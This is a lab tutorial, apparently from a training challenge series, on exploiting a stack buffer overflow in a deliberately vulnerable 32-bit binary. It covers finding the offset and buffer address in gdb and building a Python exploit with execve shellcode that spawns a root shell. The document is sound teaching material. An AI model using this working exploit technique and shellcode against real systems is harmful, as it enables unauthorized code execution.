# Development of a buffer overflow exploit - 32 bit

## Introduction

We will create a functional exploit for a 32 bit program with a stack overflow vulnerability. This includes
finding the vulnerability, get all necessary information for our exploit, and create a sample exploit as
python program.


## Goal

* Write a buffer whose SIP points to our shellcode
* Give that buffer to the vulnerable program to execute a shell


## Source

* Source directory: `~/challenges/challenge11/`
* Source files: [challenge11](https://github.com/dobin/yookiterm-challenges-files/tree/master/challenge11)

You can compile it by calling `make` in the folder `~/challenges/challenge11`

The source is identical with challenge10.


## Vulnerability

A reminder, the vulnerability lies here:

```
void handleData(char *username, char *password) {
    int isAdmin = 0;
    char name[128];
    ...
    strcpy(name, username); // strcpy() is unsafe
    ...
}

int main(int argc, char **argv) {
    handleData(argv[1], argv[2]);
}
```

The first argument of the program is copied into a stack buffer `name` of 128 byte size.



## Analysis

```
$ file challenge11
vulnerable: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f6b1aab172bde7f561e30ef84f253da4a081d8d7, not stripped
```

It is 32 bit. 


## Normal behaviour

Run Programm with normal arguments:
```
~/challenges/challenge11$ ./challenge11 hacker test
isAdmin: 0x0
Not admin.
```


## The exploit

Read the prepared exploit `challenge11-exploit.py`. 
```python
#!/usr/bin/python3
# Skeleton exploit for challenge11

import sys

shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";
offset = 0
ret_addr = b"\x41\x41\x41\x41"

def make(offset, ret_addr, buf_size=128):
    exploit = b"\x90" * (buf_size - len(shellcode))
    exploit += shellcode

    exploit += b"A" * (offset - len(exploit))
    exploit += ret_addr

    return exploit

exploit = make(offset, ret_addr)
sys.stdout.buffer.write(exploit)
```

Change the following two values:
```
offset = 132
ret_addr = b"\x42\x42\x42\x42"
```

And observe its output:
```sh
~/challenges/challenge11$ ./challenge11-exploit.py | hexdump -Cv
00000000  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
00000010  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
00000020  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
00000030  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
00000040  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
00000050  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
00000060  90 90 90 90 90 90 90 90  90 31 c0 50 68 6e 2f 73  |.........1.Phn/s|
00000070  68 68 2f 2f 62 69 89 e3  31 c9 31 d2 b0 0b cd 80  |hh//bi..1.1.....|
00000080  41 41 41 41 42 42 42 42                           |AAAABBBB|
00000088
```

All it does is to print a long string, consisting of three parts: 
* `0x90`: The NOP Sled
* Followed by the shellcode, starting from `0x31 0xc0`
* `0x41` = "A" fill material between buffer and SIP which can get trashed
* `0x42` = "B" where the SIP / return address should be put


## The offset

As we found out in the previous challenge, the offset, or number of bytes
the SIP is located after the start of the buffer, is `144`. 

Lets verify this again:

```sh
~/challenges/challenge11$ gdb -q challenge11
Reading symbols from challenge11...

(gdb) r `perl -e 'print "A" x 144 . "BBBB"'` password
Starting program: /root/challenges/challenge11/challenge11 `perl -e 'print "A" x 144 . "BBBB"'` password
isAdmin: 0x41414141
You are admin!

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

With an input string of A x 144 + BBBB, the program crashes at memory location 0x42424242 - which is
"BBBB", and exactly what we want. 


## Find buffer base address

We need to find the address of the buffer where our shellcode is stored in the process we are debugging.
This buffer transferred via `argv[1]` into `char name[128]` in the function `handleData()`. 

Therefore we can just break at the end of `handleData()`, and print the address
of the `user` variable:

Check disassembly of handleData:
```sh
(gdb) disas handleData
Dump of assembler code for function handleData:
   0x08049211 <+0>:     push   ebp
   0x08049212 <+1>:     mov    ebp,esp
   0x08049214 <+3>:     sub    esp,0x98
   0x0804921a <+9>:     mov    DWORD PTR [ebp-0xc],0x0
   0x08049221 <+16>:    sub    esp,0xc
   0x08049224 <+19>:    push   DWORD PTR [ebp+0xc]
   0x08049227 <+22>:    call   0x80491b2 <checkPassword>
   0x0804922c <+27>:    add    esp,0x10
   0x0804922f <+30>:    mov    DWORD PTR [ebp-0xc],eax
   0x08049232 <+33>:    sub    esp,0x8
   0x08049235 <+36>:    push   DWORD PTR [ebp+0x8]
   0x08049238 <+39>:    lea    eax,[ebp-0x8c]
   0x0804923e <+45>:    push   eax
   0x0804923f <+46>:    call   0x8049050 <strcpy@plt>
   0x08049244 <+51>:    add    esp,0x10
   0x08049247 <+54>:    sub    esp,0x8
   0x0804924a <+57>:    push   DWORD PTR [ebp-0xc]
   0x0804924d <+60>:    push   0x804a08e
   0x08049252 <+65>:    call   0x8049040 <printf@plt>
   0x08049257 <+70>:    add    esp,0x10
   0x0804925a <+73>:    cmp    DWORD PTR [ebp-0xc],0x0
   0x0804925e <+77>:    jle    0x8049272 <handleData+97>
   0x08049260 <+79>:    sub    esp,0xc
   0x08049263 <+82>:    push   0x804a09d
   0x08049268 <+87>:    call   0x8049060 <puts@plt>
   0x0804926d <+92>:    add    esp,0x10
   0x08049270 <+95>:    jmp    0x8049282 <handleData+113>
   0x08049272 <+97>:    sub    esp,0xc
   0x08049275 <+100>:   push   0x804a0ac
   0x0804927a <+105>:   call   0x8049060 <puts@plt>
   0x0804927f <+110>:   add    esp,0x10
   0x08049282 <+113>:   nop
   0x08049283 <+114>:   leave
   0x08049284 <+115>:   ret
End of assembler dump.
```

Set Breakpoint in GDB. We can break anywhere in the function, lets say at the `ret` instruction
at `0x08049284` or `handleData+115`:
```sh
(gdb) b *handleData+115
Breakpoint 1 at 0x8049284: file challenge11.c, line 33.
```

Run it as before:

```sh
(gdb) r `perl -e 'print "A" x 144 . "BBBB"'` password
Starting program: /root/challenges/challenge11/challenge11 `perl -e 'print "A" x 144 . "BBBB"'` password
isAdmin: 0x41414141
You are admin!
Breakpoint 1, 0x08049284 in handleData (username=0xffffde00 "LC\253,h1T\345\356.pi686", password=0xffffded7 "password") at challenge11.c:33
33      }

(gdb) print &name
$1 = (char (*)[128]) 0xffffdb9c
```

So `print &name` shows us the address of the `char name[128]` local variable in the function `handleData()`,
which is `0xffffdb9c` in memory / RAM. 

Lets verify this by printing a string at that location:
```
(gdb) x/1s 0xffffdb9c
0xffffdb9c:     'A' <repeats 144 times>, "BBBB"
```

Note that there is a high probability that you get a slightly different address (unlike the offset, which is pretty stable). 


## Exploit writing

We can insert our values into our prepared exploit `challenge11-exploit.py`:
```
offset = 144
ret_addr = "\x9c\xdb\xff\xff"
```

Remember to convert the `ret_value` number `0xffffdb9c` into little endian first. 

Lets try our new exploit:
```
~/challenges/challenge11$ ./challenge11-exploit.py | hexdump -Cv
00000000  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
00000010  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
00000020  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
00000030  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
00000040  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
00000050  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
00000060  90 90 90 90 90 90 90 90  90 31 c0 50 68 6e 2f 73  |.........1.Phn/s|
00000070  68 68 2f 2f 62 69 89 e3  31 c9 31 d2 b0 0b cd 80  |hh//bi..1.1.....|
00000080  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000090  9c db ff ff                                       |....|
00000094
```

Looking good. Execute it in GDB:
```
(gdb) r `python3 ./challenge11-exploit.py` password
Starting program: /root/challenges/challenge11/challenge11 `python3 ./challenge11-exploit.py` password

isAdmin: 0x41414141
You are admin!
process 848 is executing new program: /usr/bin/dash
# id
[Detaching after vfork from child process 853]
uid=0(root) gid=0(root) groups=0(root)
#
```

It worked! The program spawned a usable shell!


## Verify in GDB

Lets check how the exploit looks like in GDB.

Set a breakpoint at `handleData+115`, which is again exactly before the `ret` (= `pop eip`)
instruction gets executed. 
```
(gdb) b *handleData+115
Breakpoint 1 at 0x8049284: file challenge11.c, line 33.
(gdb) r `python3 ./challenge11-exploit.py` password
Starting program: /root/challenges/challenge11/challenge11 `python3 ./challenge11-exploit.py` password
isAdmin: 0x41414141
You are admin!

Breakpoint 1, 0x08049284 in handleData (username=0xffffde00 "\a\240<\026#\230\223\274\n\a\257i686", password=0xffffded7 "password") at challenge11.c:33
33      }
```

Whats the value on the stack which will be put into EIP?
```
(gdb) x/1x $esp
0xffffdc2c:     0xffffdb9c
```

The value at ESP is `0xffffdb9c`. This gets loaded into EIP. It should point to our shellcode:
```
(gdb) x/32i 0xffffdb9c
   0xffffdb9c:  nop
   0xffffdb9d:  nop
   0xffffdb9e:  nop
   0xffffdb9f:  nop
   0xffffdba0:  nop
...
   0xffffdc01:  nop
   0xffffdc02:  nop
   0xffffdc03:  nop
   0xffffdc04:  nop
   0xffffdc05:  xor    eax,eax
   0xffffdc07:  push   eax
   0xffffdc08:  push   0x68732f6e
   0xffffdc0d:  push   0x69622f2f
   0xffffdc12:  mov    ebx,esp
   0xffffdc14:  xor    ecx,ecx
   0xffffdc16:  xor    edx,edx
   0xffffdc18:  mov    al,0xb
   0xffffdc1a:  int    0x80
   0xffffdc1c:  inc    ecx
   0xffffdc1d:  inc    ecx
   0xffffdc1e:  inc    ecx
   0xffffdc1f:  inc    ecx
   0xffffdc20:  inc    ecx
```

As expected: We see the NOP sled, and the shellcode after starting at address `0xffffdc05`.


## Test exploit without gdb

Lets test it without gdb:

```
~/challenges/challenge11$ ./challenge11 `python3 ./challenge11-exploit.py` password
isAdmin: 0x41414141
You are admin!
Segmentation fault (core dumped)
~/challenges/challenge11$ ls
Makefile  challenge11  challenge11-exploit.py  challenge11.c  core.173
```

Ouch, no shell. We have the analyze the core file which was generated: `core.173`. 
It contains a copy of the process memory when it crashed.

```
~/challenges/challenge11$ gdb -q challenge11 core.173
Reading symbols from challenge11...
[New LWP 173]
Core was generated by `./challenge11 '.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xffffdbad in ?? ()
(gdb) x/32x $eip
0xffffdbad:     0x78000000      0xf0ffffdc      0x01f7fe88      0x00000000
0xffffdbbd:     0x00000000      0x00f7f800      0x78f7f800      0x6dffffdc
0xffffdbcd:     0x9d080492      0x410804a0      0x00414141      0x8cf7ffd0
0xffffdbdd:     0x00ffffdd      0x00000000      0x60000000      0x90fffffa
0xffffdbed:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdbfd:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdc0d:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdc1d:     0x90909090      0x90909090      0x90909090      0x90909090
```

We can simply look where EIP is pointing, and realize that the actual shellcode
seems to be several dozen bytes behind the current EIP. The `0x90` actually start at
around `0xffffdbed`. Lets jump a bit more in the middle of the shellcode,
lets say at address `0xffffdc0d`:

```
(gdb) x/32x 0xffffdc0d
0xffffdc0d:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdc1d:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdc2d:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdc3d:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdc4d:     0x90909090      0x90909090      0x6850c031      0x68732f6e
0xffffdc5d:     0x622f2f68      0x31e38969      0xb0d231c9      0x4180cd0b
0xffffdc6d:     0x41414141      0x41414141      0x41414141      0x23414141
0xffffdc7d:     0x00000000      0x12ffffde      0x64ffffdf      0x0dffffdd
```

Therefore, lets adjust the exploit once again:
```
ret_addr = "\x0d\xdc\xff\xff"
```

And try it again, outside GDB:
```
~/challenges/challenge11$ ./challenge11 `python3 ./challenge11-exploit.py` password
isAdmin: 0x41414141
You are admin!
# id
uid=0(root) gid=0(root) groups=0(root)
#
```

It works! The bash has been executed. Even though the binary does not have the code
for this functionality, we injected it with our shellcode.


## Things to think about

* Can you create an exploit which works with both, with- and without GDB?
* Can you create an exploit where the shellcode is stored in the variable password (argv[2])?
